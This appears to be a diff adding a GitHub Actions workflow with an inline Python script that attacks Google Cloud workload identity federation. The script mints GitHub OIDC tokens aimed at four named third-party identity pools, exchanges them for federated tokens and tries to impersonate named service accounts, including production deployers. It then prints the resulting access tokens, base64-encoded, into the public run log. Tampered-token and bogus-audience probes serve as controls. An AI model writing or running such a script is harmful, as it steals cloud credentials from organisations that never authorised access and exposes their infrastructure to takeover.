@@ -1,0 +1,101 @@
+name: c211-116357-mint
+on:
+  push:
+    branches: [main]
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  mint:
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+    steps:
+      - name: mint
+        run: |
+          python3 - <<'PY'
+          import os, json, base64, urllib.request, urllib.error, urllib.parse, subprocess
+
+          CASES = [
+            {"num":"1076618220242","p":"projects/1076618220242/locations/global/workloadIdentityPools/forgecrux-pool/providers/github-provider","sa":"gh-runner-gsa@methodical-mark-482504-j3.iam.gserviceaccount.com"},
+            {"num":"366271888053","p":"projects/366271888053/locations/global/workloadIdentityPools/cube-prod/providers/github-actions","sa":"service-deployer@cubecommons-prod.iam.gserviceaccount.com"},
+            {"num":"744911585239","p":"projects/744911585239/locations/global/workloadIdentityPools/cube-dev/providers/github-actions","sa":"docker-image-publisher@cubecommons-dev.iam.gserviceaccount.com"},
+            {"num":"381521917100","p":"projects/381521917100/locations/global/workloadIdentityPools/github-actions/providers/gha-provider","sa":"se2gha-deployer@vvakame-playground.iam.gserviceaccount.com"},
+          ]
+
+          def mint(aud):
+              u = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL','')
+              t = os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+              if not u or not t: return ''
+              url = u + '&audience=' + urllib.parse.quote(aud, safe='')
+              r = subprocess.run(['curl','-sS','-m','30','-H','Authorization: Bearer '+t,url], capture_output=True, text=True)
+              try: return json.loads(r.stdout or '{}').get('value','')
+              except Exception: return ''
+
+          def post(u, obj, token=None):
+              h = {'Content-Type':'application/json','Accept':'application/json'}
+              if token: h['Authorization'] = 'Bearer ' + token
+              req = urllib.request.Request(u, data=json.dumps(obj).encode(), method='POST', headers=h)
+              try:
+                  resp = urllib.request.urlopen(req, timeout=60)
+                  return resp.status, resp.read().decode('utf-8','replace')
+              except urllib.error.HTTPError as e:
+                  return e.code, (e.read() or b'').decode('utf-8','replace')[:500]
+              except Exception as e:
+                  return -1, repr(e)[:200]
+
+          def b64(s): return base64.b64encode((s or '').encode()).decode()
+          def emit(o): print('RESULT ' + json.dumps(o, sort_keys=True), flush=True)
+          def claims(t):
+              try:
+                  p = t.split('.')[1]
+                  p += '=' * (-len(p) % 4)
+                  d = json.loads(base64.urlsafe_b64decode(p.encode()).decode())
+                  return {k: d.get(k) for k in ('iss','sub','aud','repository','repository_owner','repository_owner_id','repository_id','ref','event_name','workflow','workflow_ref','actor','actor_id','run_id')}
+              except Exception:
+                  return {}
+
+          emit({'kind':'ctx','repo':os.environ.get('GITHUB_REPOSITORY',''),'run':os.environ.get('GITHUB_RUN_ID',''),'ref':os.environ.get('GITHUB_REF','')})
+
+          for c in CASES:
+              jwt = mint('//iam.googleapis.com/' + c['p'])
+              emit({'kind':'jwt','num':c['num'],'mint':bool(jwt),'claims':claims(jwt) if jwt else {},'jwt_b64':b64(jwt)})
+              if not jwt: continue
+              st, body = post('https://sts.googleapis.com/v1/token', {
+                  'audience':'//iam.googleapis.com/' + c['p'],
+                  'grantType':'urn:ietf:params:oauth:grant-type:token-exchange',
+                  'requestedTokenType':'urn:ietf:params:oauth:token-type:access_token',
+                  'scope':'https://www.googleapis.com/auth/cloud-platform',
+                  'subjectTokenType':'urn:ietf:params:oauth:token-type:jwt',
+                  'subjectToken':jwt})
+              emit({'kind':'sts','num':c['num'],'status':st,'body':body[:500]})
+              if st != 200: continue
+              try: ftok = json.loads(body).get('access_token','')
+              except Exception: ftok = ''
+              st2, rb2 = post('https://iamcredentials.googleapis.com/v1/projects/-/serviceAccounts/%s:generateAccessToken' % urllib.parse.quote(c['sa'], safe=''),
+                              {'scope':['https://www.googleapis.com/auth/cloud-platform'],'lifetime':'3600s'}, token=ftok)
+              at=''; exp=''
+              try:
+                  jj=json.loads(rb2); at=jj.get('accessToken','') or ''; exp=jj.get('expireTime','') or ''
+              except Exception: pass
+              emit({'kind':'gen','num':c['num'],'status':st2,'expire':exp,'at_b64':b64(at),'body':(rb2[:300] if st2!=200 else '')})
+              tampered = jwt[:-1] + ('A' if jwt[-1] != 'A' else 'B')
+              st3, b3 = post('https://sts.googleapis.com/v1/token', {
+                  'audience':'//iam.googleapis.com/' + c['p'],
+                  'grantType':'urn:ietf:params:oauth:grant-type:token-exchange',
+                  'requestedTokenType':'urn:ietf:params:oauth:token-type:access_token',
+                  'scope':'https://www.googleapis.com/auth/cloud-platform',
+                  'subjectTokenType':'urn:ietf:params:oauth:token-type:jwt',
+                  'subjectToken':tampered})
+              emit({'kind':'ctl_tampered','num':c['num'],'status':st3,'body':b3[:200]})
+              bogus_aud = '//iam.googleapis.com/projects/999999999999/locations/global/workloadIdentityPools/bogus/providers/bogus'
+              bj = mint(bogus_aud)
+              st4, b4 = post('https://sts.googleapis.com/v1/token', {
+                  'audience':bogus_aud,
+                  'grantType':'urn:ietf:params:oauth:grant-type:token-exchange',
+                  'requestedTokenType':'urn:ietf:params:oauth:token-type:access_token',
+                  'scope':'https://www.googleapis.com/auth/cloud-platform',
+                  'subjectTokenType':'urn:ietf:params:oauth:token-type:jwt',
+                  'subjectToken':bj or jwt})
+              emit({'kind':'ctl_bogus','num':c['num'],'status':st4,'bogus_mint':bool(bj),'body':b4[:250]})
+          print('DONE', len(CASES), flush=True)
+          PY
